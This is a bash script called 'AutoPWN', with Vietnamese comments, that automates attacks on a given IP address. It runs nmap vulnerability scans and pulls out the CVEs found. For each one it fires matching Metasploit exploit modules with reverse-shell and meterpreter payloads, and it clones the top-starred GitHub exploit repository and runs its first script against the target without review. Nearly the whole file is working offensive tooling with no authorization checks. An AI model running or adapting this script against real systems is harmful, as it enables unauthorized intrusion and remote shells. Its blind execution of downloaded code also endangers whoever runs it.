#!/bin/bash

TARGET=$1
REPORT_DIR="autopwn_report"
NMAP_OUT="$REPORT_DIR/nmap_scan.txt"
CVE_LIST="$REPORT_DIR/cve_list.txt"
LOG_FILE="$REPORT_DIR/exploit_log.txt"
HTML_REPORT="$REPORT_DIR/report.html"
GITHUB_DIR="$REPORT_DIR/github_exploits"

MAX_JOBS=3 # số exploit chạy song song

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

mkdir -p $REPORT_DIR $GITHUB_DIR
> $CVE_LIST
> $LOG_FILE

# ----------------------------
# Bước 1: Quét CVE bằng Nmap
# ----------------------------
echo "[*] Quét lỗ hổng bằng Nmap..."
nmap -sV --script vuln $TARGET -oN $NMAP_OUT

echo "[*] Trích xuất CVE..."
grep -Eo "CVE-[0-9]{4}-[0-9]{4,7}" $NMAP_OUT | sort -u > $CVE_LIST

if [ ! -s $CVE_LIST ]; then
    echo "[!] Không tìm thấy CVE!"
    exit 1
fi

echo "[+] Danh sách CVE:"
cat $CVE_LIST

# ----------------------------
# Hàm khai thác CVE
# ----------------------------
exploit_cve() {
    CVE=$1
    echo -e "\n[+] Đang xử lý CVE: $CVE" | tee -a $LOG_FILE

    # 1. Tìm module trong Metasploit
    MODULES=$(msfconsole -q -x "search $CVE; exit" | grep exploit | awk '{print $2}')
    if [ -n "$MODULES" ]; then
        for MODULE in $MODULES; do
            echo "[*] MSF Module: $MODULE" | tee -a $LOG_FILE
            PAYLOAD="generic/shell_reverse_tcp"
            if [[ $MODULE == *"windows"* ]]; then
                PAYLOAD="windows/meterpreter/reverse_tcp"
            elif [[ $MODULE == *"linux"* ]]; then
                PAYLOAD="linux/x86/meterpreter/reverse_tcp"
            fi
            msfconsole -q -x "
                use $MODULE;
                set RHOSTS $TARGET;
                set LHOST 0.0.0.0;
                set PAYLOAD $PAYLOAD;
                set EXITFUNC thread;
                run -j;
                exit;
            " | tee -a $LOG_FILE
        done
    else
        echo "[!] Không có module trong Metasploit cho $CVE" | tee -a $LOG_FILE
    fi

    # 2. Tìm exploit trên GitHub
    echo "[*] Đang tìm trên GitHub..." | tee -a $LOG_FILE
    GIT_URL=$(curl -s "https://api.github.com/search/repositories?q=$CVE+exploit&sort=stars" \
        | grep '"html_url"' | head -n 1 | cut -d '"' -f 4)

    if [ -n "$GIT_URL" ]; then
        echo "[+] Tìm thấy trên GitHub: $GIT_URL" | tee -a $LOG_FILE
        REPO_NAME=$(basename $GIT_URL)
        CLONE_DIR="$GITHUB_DIR/${CVE}_${REPO_NAME}"
        git clone --depth 1 "$GIT_URL" "$CLONE_DIR" >/dev/null 2>&1

        # Thử chạy nếu có file .py hoặc .sh
        EXP_FILE=$(find "$CLONE_DIR" -maxdepth 2 -type f \( -name "*.py" -o -name "*.sh" \) | head -n 1)
        if [ -n "$EXP_FILE" ]; then
            echo "[*] Chạy exploit từ GitHub: $EXP_FILE" | tee -a $LOG_FILE
            chmod +x "$EXP_FILE"
            if [[ "$EXP_FILE" == *.py ]]; then
                python3 "$EXP_FILE" "$TARGET" | tee -a $LOG_FILE
            else
                "$EXP_FILE" "$TARGET" | tee -a $LOG_FILE
            fi
        else
            echo "[!] Repo không có script chạy tự động" | tee -a $LOG_FILE
        fi
    else
        echo "[!] Không tìm thấy trên GitHub" | tee -a $LOG_FILE
    fi
}

export -f exploit_cve
export TARGET LOG_FILE GITHUB_DIR

# ----------------------------
# Khai thác song song
# ----------------------------
cat $CVE_LIST | xargs -n 1 -P $MAX_JOBS -I {} bash -c 'exploit_cve "$@"' _ {}

# ----------------------------
# Xuất báo cáo HTML
# ----------------------------
{
    echo "<html><body><h1>AutoPWN Report - $TARGET</h1><ul>"
    while read CVE; do
        echo "<li><a href='https://nvd.nist.gov/vuln/detail/$CVE' target='_blank'>$CVE</a></li>"
    done < $CVE_LIST
    echo "</ul><pre>"
    cat $LOG_FILE
    echo "</pre></body></html>"
} > $HTML_REPORT

echo "[+] Hoàn tất! Báo cáo: $HTML_REPORT"
